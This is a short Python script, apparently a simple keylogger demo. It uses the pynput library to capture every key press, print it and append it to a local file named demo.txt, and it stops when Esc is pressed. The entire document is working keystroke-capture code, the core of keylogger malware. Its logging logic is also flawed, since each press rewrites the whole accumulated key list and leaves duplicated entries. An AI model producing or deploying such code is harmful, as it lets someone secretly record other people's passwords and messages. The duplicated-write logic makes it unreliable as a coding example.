from pynput.keyboard import Key,Listener

lstkeys = []

def on_press(key):
    lstkeys.append(key)
    write_data(lstkeys)
    print(key)

def write_data(var):
    with open("demo.txt", "a") as f:
        for i in var:
            new_var = str(i).replace("'","")
            f.write(new_var)
            f.write(" ")


def on_release(key):
    if key==Key.esc:
        return False

with Listener(on_press=on_press,on_release=on_release) as l:
    l.join()